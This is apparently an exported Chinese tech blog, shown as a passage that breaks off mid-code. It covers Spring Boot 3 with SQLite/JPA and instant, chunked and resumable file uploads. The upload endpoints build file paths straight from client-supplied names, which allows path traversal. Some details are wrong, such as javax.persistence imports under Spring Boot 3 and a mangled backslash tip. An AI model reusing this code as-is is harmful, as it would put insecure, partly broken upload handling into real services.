<p>这里的url需要填写你实际的 SQLLite 数据库文件路径，如果文件不存在，系统会自动创建。需要注意的是，路径的书写要符合操作系统的规范，例如在 Windows 系统中，路径分隔符要用\，但由于\在 YAML 文件中有转义的作用，所以需要写成\。如果不确定路径是否正确，可以先手动创建一个数据库文件，获取其准确路径后再进行配置。另外，driver-class-name指定了数据库驱动类，必须准确填写为org.sqlite.JDBC，否则 Spring Boot3 无法识别并加载正确的驱动。</p>
<blockquote>
<p>创建数据库操作接口和实现类</p>
</blockquote>
<p>创建一个数据库操作接口，比如UserRepository，继承JpaRepository，方便进行数据库的增删改查操作：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;</span><br><span class="line"><span class="keyword">import</span> com.example.demo.entity.User;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserRepository</span> <span class="keyword">extends</span> <span class="title class_">JpaRepository</span>&lt;User, Long&gt; &#123;</span><br><span class="line">    <span class="comment">// 可以自定义一些查询方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>JpaRepository提供了一系列常用的数据库操作方法，如save、findById、delete等，极大地简化了数据库操作代码。同时，我们还可以在这个接口中自定义查询方法，比如按照用户名查询用户信息：User findByName(String name);。定义好接口后，Spring Data JPA 会自动生成接口的实现类，开发者无需手动编写复杂的数据库操作代码。</p>
<p>然后创建对应的实体类User，映射数据库表结构：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.persistence.Entity;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.GeneratedValue;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.GenerationType;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.Id;</span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="comment">// 省略getter和setter方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这个实体类中，@Entity注解表明该类是一个 JPA 实体类，会与数据库表进行映射。@Id注解标识该字段为主键，@GeneratedValue注解指定了主键的生成策略，这里使用IDENTITY策略，表示自增长主键。在实际开发中，如果表结构较为复杂，除了基本的字段映射，还可能需要处理一对一、一对多、多对多等关系映射，可以通过@OneToOne、@OneToMany、@ManyToMany等注解来实现。</p>
<blockquote>
<p>测试连接与操作</p>
</blockquote>
<p>在Spring Boot3的测试类中，注入UserRepository，编写测试方法，验证数据库连接和操作是否成功：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"><span class="keyword">import</span> com.example.demo.repository.UserRepository;</span><br><span class="line"><span class="keyword">import</span> com.example.demo.entity.User;</span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SQLLiteTest</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserRepository userRepository;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testSaveUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        user.setAge(<span class="number">25</span>);</span><br><span class="line">        userRepository.save(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在运行测试方法前，确保项目已经正确启动，并且数据库相关的配置都已生效。如果测试失败，可能会出现各种错误信息，比如Could not connect to database，这通常是数据源配置错误导致的；Entity class [class<br>com.example.demo.entity.User] not found，则可能是实体类的包扫描路径设置不正确。针对这些错误，可以通过查看控制台输出的详细错误日志，逐步排查问题并解决。</p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot功能一【文件上传之秒传、断点续传、分片上传】</title>
    <url>/cnblogs.github.io/p/2b2b.html</url>
    <content><![CDATA[<h2 id="一-秒传、断点上传与分片上传"><a href="#一-秒传、断点上传与分片上传" class="headerlink" title="一 秒传、断点上传与分片上传"></a>一 秒传、断点上传与分片上传</h2><h3 id="秒传"><a href="#秒传" class="headerlink" title="秒传"></a>秒传</h3><p>秒传，顾名思义，就是几乎瞬间完成文件上传的过程。其实现原理是通过计算文件的哈希值（如 MD5 或 SHA-1），然后将这个唯一的标识符发送给服务器。如果服务器上已经存在相同的文件，则直接返回成功信息，避免了重复上传。这种方式不仅节省了带宽，也大大提高了用户体验。</p>
<h3 id="断点续传"><a href="#断点续传" class="headerlink" title="断点续传"></a>断点续传</h3><p>断点续传是指在网络不稳定或者用户主动中断上传后，能够从上次中断的地方继续上传，而不需要重新开始整个过程。这对于大文件上传尤为重要，因为它可以有效防止因网络问题导致的上传失败，同时也能节约用户的流量和时间。</p>
<h3 id="分片上传"><a href="#分片上传" class="headerlink" title="分片上传"></a>分片上传</h3><p>分片上传则是将一个大文件分割成多个小块分别上传，最后再由服务器合并成完整的文件。这种做法的好处是可以并行处理多个小文件，提高上传效率；同时，如果某一部分上传失败，只需要重传这一部分，不影响其他部分。</p>
<h2 id="二-秒传实战"><a href="#二-秒传实战" class="headerlink" title="二 秒传实战"></a>二 秒传实战</h2><h3 id="后端实现"><a href="#后端实现" class="headerlink" title="后端实现"></a>后端实现</h3><p>在 SpringBoot 项目中，我们可以使用 MessageDigest 类来计算文件的 MD5 值，然后检查数据库中是否存在该文件。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/file&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    FileService fileService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/upload1&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;String&gt; <span class="title function_">secondUpload</span><span class="params">(<span class="meta">@RequestParam(value = &quot;file&quot;,required = false)</span> MultipartFile file,<span class="meta">@RequestParam(required = false,value = &quot;md5&quot;)</span> String md5)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 检查数据库中是否已存在该文件</span></span><br><span class="line">            <span class="keyword">if</span> (fileService.existsByMd5(md5)) &#123;</span><br><span class="line">                <span class="keyword">return</span> ResponseEntity.ok(<span class="string">&quot;文件已存在&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 保存文件到服务器</span></span><br><span class="line">            file.transferTo(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/path/to/save/&quot;</span> + file.getOriginalFilename()));</span><br><span class="line">            <span class="comment">// 保存文件信息到数据库</span></span><br><span class="line">            fileService.save(<span class="keyword">new</span> <span class="title class_">FileInfo</span>(file.getOriginalFilename(), DigestUtils.md5DigestAsHex(file.getInputStream())));</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.ok(<span class="string">&quot;上传成功&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(<span class="string">&quot;上传失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="前端调用"><a href="#前端调用" class="headerlink" title="前端调用"></a>前端调用</h3><p>前端可以通过 JavaScript 的 FileReader API 读取文件内容，通过 spark-md5 计算 MD5 值，然后发送给后端进行校验。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>秒传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;spark-md5.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;fileInput&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;startUpload()&quot;</span>&gt;</span>开始上传<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">startUpload</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> fileInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;fileInput&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> file = fileInput.<span class="property">files</span>[<span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (!file) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&quot;请选择文件&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> md5 = <span class="keyword">await</span> <span class="title function_">calculateMd5</span>(file);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span></span><br><span class="line"><span class="language-javascript">        formData.<span class="title function_">append</span>(<span class="string">&#x27;md5&#x27;</span>, md5);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/file/upload1&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">body</span>: formData</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> result = <span class="keyword">await</span> response.<span class="title function_">text</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (result != <span class="string">&quot;文件已存在&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 开始上传文件</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;上传失败: &quot;</span> + result);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">calculateMd5</span>(<span class="params">file</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>();</span></span><br><span class="line"><span class="language-javascript">            reader.<span class="property">onloadend</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> spark = <span class="keyword">new</span> <span class="title class_">SparkMD5</span>.<span class="title class_">ArrayBuffer</span>();</span></span><br><span class="line"><span class="language-javascript">                spark.<span class="title function_">append</span>(reader.<span class="property">result</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">resolve</span>(spark.<span class="title function_">end</span>());</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript">            reader.<span class="property">onerror</span> = <span class="function">() =&gt;</span> <span class="title function_">reject</span>(reader.<span class="property">error</span>);</span></span><br><span class="line"><span class="language-javascript">            reader.<span class="title function_">readAsArrayBuffer</span>(file);</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>前端分为两个步骤：</p>
<ul>
<li>计算文件的 MD5 值，计算之后发送给服务端确定文件是否存在。</li>
<li>如果文件已经存在，则不需要继续上传文件；如果文件不存在，则开始上传文件，上传文件和 MD5 校验请求类似，上面的案例代码中我就没有重复演示了，松哥在书里和之前的课程里都多次讲过文件上传，这里不再啰嗦。</li>
</ul>
<h2 id="三-分片上传实战"><a href="#三-分片上传实战" class="headerlink" title="三 分片上传实战"></a>三 分片上传实战</h2><p>分片上传关键是在前端对文件切片，比如一个 10MB 的文件切为 10 份，每份 1MB。每次上传的时候，需要多一个参数记录当前上传的文件切片的起始位置。<br>比如一个 10MB 的文件，切为 10 份，每份 1MB，那么：</p>
<ul>
<li>第 0 片，从 0 开始，一共是 1024*1024 个字节。</li>
<li>第 1 片，从 1024<em>1024 开始，一共是 1024</em>1024 个字节。</li>
<li>第 2 片…</li>
</ul>
<p>把这个搞懂，后面的代码就好理解了。</p>
<h3 id="后端实现-1"><a href="#后端实现-1" class="headerlink" title="后端实现"></a>后端实现</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">UPLOAD_DIR</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;user.home&quot;</span>) + <span class="string">&quot;/uploads/&quot;</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 上传文件到指定位置</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> file 上传的文件</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> start 文件开始上传的位置</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> ResponseEntity&lt;String&gt; 上传结果</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/upload2&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;String&gt; <span class="title function_">resumeUpload</span><span class="params">(<span class="meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file, <span class="meta">@RequestParam(&quot;start&quot;)</span> <span class="type">long</span> start,<span class="meta">@RequestParam(&quot;fileName&quot;)</span> String fileName)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">directory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(UPLOAD_DIR);</span><br><span class="line">        <span class="keyword">if</span> (!directory.exists()) &#123;</span><br><span class="line">            directory.mkdirs();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">File</span> <span class="variable">targetFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(UPLOAD_DIR + fileName);</span><br><span class="line">        <span class="type">RandomAccessFile</span> <span class="variable">randomAccessFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(targetFile, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line">        <span class="type">FileChannel</span> <span class="variable">channel</span> <span class="operator">=</span> randomAccessFile.getChannel();</span><br><span class="line">        channel.position(start);</span><br><span class="line">        channel.transferFrom(file.getResource().readableChannel(), start, file.getSize());</span><br><span class="line">        channel.close();</span><br><span class="line">        randomAccessFile.close();</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.ok(<span class="string">&quot;上传成功&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;上传失败: &quot;</span>+e.getMessage());</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.status(<span class="number">500</span>).body(<span class="string">&quot;上传失败&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后端每次处理的时候，需要先设置文件的起始位置。</p>
<h3 id="前端调用-1"><a href="#前端调用-1" class="headerlink" title="前端调用"></a>前端调用</h3><p>前端需要将文件切分成多个小块，然后依次上传。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>分片示例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;fileInput&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;startUpload()&quot;</span>&gt;</span>开始上传<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">startUpload</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> fileInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;fileInput&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> file = fileInput.<span class="property">files</span>[<span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (!file) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(<span class="string">&quot;请选择文件&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> filename = file.<span class="property">name</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> start = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">uploadFile</span>(file, start);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">uploadFile</span>(<span class="params">file, start</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> chunkSize = <span class="number">1024</span> * <span class="number">1024</span>; <span class="comment">// 每个分片1MB</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> total = <span class="title class_">Math</span>.<span class="title function_">ceil</span>(file.<span class="property">size</span> / chunkSize);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; total; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> chunkStart = start + i * chunkSize;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> chunkEnd = <span class="title class_">Math</span>.<span class="title function_">min</span>(chunkStart + chunkSize, file.<span class="property">size</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> chunk = file.<span class="title function_">slice</span>(chunkStart, chunkEnd);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span></span><br><span class="line"><span class="language-javascript">                formData.<span class="title function_">append</span>(<span class="string">&#x27;file&#x27;</span>, chunk);</span></span><br><span class="line"><span class="language-javascript">                formData.<span class="title function_">append</span>(<span class="string">&#x27;start&#x27;</span>, chunkStart);</span></span><br><span class="line"><span class="language-javascript">                formData.<span class="title function_">append</span>(<span class="string">&#x27;fileName&#x27;</span>, file.<span class="property">name</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/file/upload2&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">body</span>: formData</span></span><br><span class="line"><span class="language-javascript">                &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> result = <span class="keyword">await</span> response.<span class="title function_">text</span>();</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`分片 <span class="subst">$&#123;i + <span class="number">1</span>&#125;</span>/<span class="subst">$&#123;total&#125;</span> 上传成功`</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`分片 <span class="subst">$&#123;i + <span class="number">1</span>&#125;</span>/<span class="subst">$&#123;total&#125;</span> 上传失败: <span class="subst">$&#123;result&#125;</span>`</span>);</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="四-断点续传实战"><a href="#四-断点续传实战" class="headerlink" title="四 断点续传实战"></a>四 断点续传实战</h2><p>断点续传的技术原理类似于分片上传。当文件已经上传了一部分之后，断了需要重新开始上传。<br>那么我们的思路是这样的：</p>
<ul>
<li>前端先发送一个请求，检查要上传的文件在服务端是否已经存在，如果存在，目前大小是多少。</li>
<li>前端根据已经存在的大小，继续上传文件即可。</li>
</ul>
<p>后端案例<br>先来看后端检查的接口，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/check&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;Long&gt; <span class="title function_">checkFile</span><span class="params">(<span class="meta">@RequestParam(&quot;filename&quot;)</span> String filename)</span> &#123;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(UPLOAD_DIR + filename);</span><br><span class="line">    <span class="keyword">if</span> (file.exists()) &#123;</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.ok(file.length());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.ok(<span class="number">0L</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果文件存在，则返回已经存在的文件大小。如果文件不存在，则返回 0，表示前端从头开始上传该文件。</p>
<h3 id="前端调用-2"><a href="#前端调用-2" class="headerlink" title="前端调用"></a>前端调用</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>断点续传示例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;fileInput&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;startUpload()&quot;</span>&gt;</span>开始上传<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">startUpload</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> fileInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;fileInput&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> file = fileInput.<span class="property">files</span>[<span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (!file) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&quot;请选择文件&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> filename = file.<span class="property">name</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> start = <span class="keyword">await</span> <span class="title function_">checkFile</span>(filename);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">uploadFile</span>(file, start);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params">filename</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`/file/check?filename=<span class="subst">$&#123;filename&#125;</span>`</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> start = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span></span><br><span class="line"><span class="language-javascript">        <span 